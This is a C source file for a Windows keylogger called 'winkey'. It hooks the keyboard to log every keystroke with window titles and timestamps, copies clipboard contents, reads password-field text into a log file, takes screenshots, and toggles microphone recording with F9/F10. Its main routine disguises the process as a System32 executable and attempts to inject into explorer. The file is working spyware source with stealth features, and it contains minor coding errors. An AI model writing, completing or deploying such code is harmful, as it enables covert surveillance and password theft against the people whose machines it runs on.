#include "../winkey.h"

HHOOK g_ouk;
volatile int g_micro_run = 0;

DWORD WINAPI thread_micro(LPVOID lp)
{
	while(1)
	{
		if (g_micro_run)
		{
			capture_micro();
		}
		Sleep(100);
	}
	return 0;
}


void *which_open(char *exe)
{
	HWND ptr_stuct = GetForegroundWindow();
	DWORD pid = 0;
	GetWindowThreadProcessId(ptr_stuct, &pid);
	HANDLE hd = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	if (hd)
	{
		GetModuleFileNameExA(hd, NULL,exe, MAX_PATH);
		CloseHandle(hd);
	}
}


LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
{
	static HWND last_window = NULL;
	char exe[MAX_PATH] = {0};
	char key[8] = {0};
	char time[64];
	char title[256] = {0};
	char clip[1024];

	if (ncode == HC_ACTION && wp == WM_KEYDOWN)
	{
		KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lp;
		HWND current = GetForegroundWindow();
		if (current && current != last_window)
		{
			capture_screen(L"C:\\winkey_screens\\window_change.bmp");
			last_window = current;
		}
		if (is_sensitive_key(kbd->vkCode))
			capture_screen(L"C:\\winkey_screens\\sensitive_key.bmp");
		if (is_password_field(current))
		{
			capture_screen(L"C:\\winkey_screens\\password_field.bmp");
			char pwd[256] = {0};
			if (read_password_from_control(current, pwd, sizeof(pwd)))
			{
				FILE *fp = fopen("winkey.log", "a");
				if (fp)
				{
					fprintf(fp, "[PASSWORD FIELD] -> %s\n", pwd);
					fclose(fp);
				}
			}
		}
		if (kbd->vkCode == VK_F9)
		{
			printf("MICRO ACTIVE CHEF !\n:");
			g_micro_run = 1;
		}
		if (kbd->vkCode == VK_F10)
		{
			printf("MICRO DESCATIVER CHEF!\n");
			g_micro_run = 0 ;
		}
		which_open(exe);
		if (!allow_app(exe))
			return (CallNextHookEx(g_ouk, ncode, wp, lp));
		read_clipboard(clip, sizeof(clip));
		get_time(time);
		get_window_title(title);
		int new_key = vk_to_char(kbd->vkCode, key);
		char *spe_touch = special_touch(kbd->vkCode);
		FILE *f = fopen("winkey.log", "a");
		if (f)
		{
			fprintf(f, "[%s] - '%s'\n", time, title);
			if (spe_touch)
				fprintf(f, "<%s>\n", spe_touch);
			else if (new_key)
				fprintf(f, "%s\n", key);
			else
				fprintf(f, "VK(%lu)\n", kbd->vkCode);
			if (clip[0] != '\0')
				fprintf(f,"[CLIPBOARD] %s\n", clip);
			fclose(f);
		}
	}
	return CallNextHookEx(g_ouk, ncode, wp, lp);
}



void run_winkey(void)
{
	g_ouk = SetWindowsHookEx(WH_KEYBOARD_LL, callback_clavier, NULL, 0);
	MSG msg;
	if (!g_ouk)
	{
		printf("Error: can't install the hook.\n");
		return 1;
	}
	printf("winkey: hook install ;)");
	while(GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(g_ouk);
}

int main(void)
{
	disguise_process_name(L"C:\\Windows\\System32\\host.exe");
	HANDLE h = CreateThread(NULL, 0, thread_micro, NULL, 0, NULL);
	if (inject_into_explorer())
		return 0;
	run_winkey();
	return 0;
}